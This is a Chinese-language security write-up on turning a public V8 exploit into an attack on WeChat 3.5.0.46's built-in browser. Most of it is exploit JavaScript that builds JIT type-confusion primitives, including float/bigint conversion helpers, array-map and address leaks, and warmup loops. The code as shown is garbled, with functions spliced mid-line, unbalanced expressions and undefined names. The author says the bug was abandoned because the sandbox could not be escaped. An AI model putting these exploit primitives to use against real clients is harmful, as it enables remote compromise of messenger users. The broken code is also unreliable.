**作者：lxraa@识链实验室**
# 前言
由于 **无法绕过沙箱** ，该漏洞已被忽略。
谷歌在V8相关漏洞修复一段时间后，会公布（）漏洞的poc，有些漏洞有exp。但是公布的exp一般是存在漏洞的最后一个版本，由于不同版本V8的数据结构有变化，造成
**堆布局不同** ，公布的exp在 **非实验环境往往不能直接使用**
，本文以最新版微信远程命令执行为例介绍了从exp到实际环境利用脚本的构造过程中可能存在的问题及解决方案。
# 调试环境
微信3.5.0.46
UA：Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/81.0.4044.138 Safari/537.36 NetType/WIFI
MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x6305002e)
V8：8.1.307.32 32位（由UA判断，不一定准确，不过不知道准确版本也能调试）
# EXP
poc2.html
    exp
       function print(text){
        alert(text+"");
      }
    cvt_buf = new ArrayBuffer(8);
    cvt_f64a = new Float64Array(cvt_buf);
    cvt_u64a = new BigUint64Array(cvt_buf);
    cvt_u32a = new Uint32Array(cvt_buf);
    function ftoi(f) { // float -> bigint
      cvt_f64a[0] = f;
      return cvt_u64a[0];
     }
    function itof(i) { // bigint -> float
      cvt_u64a[0] = i;
      return cvt_f64a[0];
     }
    function lower(i) {
        return Number(i % (2n**32n));
    }
    function upper(i) {
        return Number(i / (2n**32n));
    }
    function pair(h,l) {
        return BigInt(h) * (2n**32n) + BigInt(l);
    }
    // todo
    function leak_array_map(arg_true, obj,flag) {
        let o = {ct: true, c0: 0, c1: 1}; 
        let aa = arg_true ? 8 : "7";
        let c0 = (Math.max(aa, 0) + aa - 16);
        let v01 = 2**32 + (o.c0 & 1);
        let xx = 2**32-1;
        let ra = (xx >>> c0) - v01;
        let rb = ((xx-2**32) > 31; // Range(0,0); is: -1
        let arr = new Array(3+30*(1+confused));
        arr[0] = 1e64; // make sure arr is of type double
        arr[1] = 2e64;
        let arr2 = new Array(10);//[1337.5, 1338.5, 1339.5]; // arr2 is of type double too
        for (var i = 0; i >> c0) - v01;
        let rb = ((xx-2**32) > 31; 
        let arr = new Array(3+30*(1+confused));
        arr[0] = 0.5; 
        let arr2 = new Array(5);    for (var idx = 0; idx >> c0) - v01;
        let rb = ((xx-2**32) > 31; 
        let arr = new Array(3+30*(1+confused));
        arr[0] = 0; //smi和obj的堆布局有不同，这里不要动
        let arr2 = new Array(5);    for (var idx = 0; idx < 5; idx+=1) arr2[idx]=0.0; 
        arr2[0] = val;
        let iter = arr[Symbol.iterator]();
        iter.next();iter.next();iter.next();
        iter.next();
        //v0应该是arr2的长度，即5
        let v0 = iter.next();
        let v1 = iter.next();
        return [v0.value,v1.value];
    }
    print("start");
    let obj = new Array(128);
    for (i=0; i < 3000; i+=1) leak_addr_helper(true,obj,false);
    alert("jit1");
    let arr = new Array(128);
    for (i=0; i < 3000; i+=1){
        leak_array_map(true,arr,false);
    } 
    print("jit2");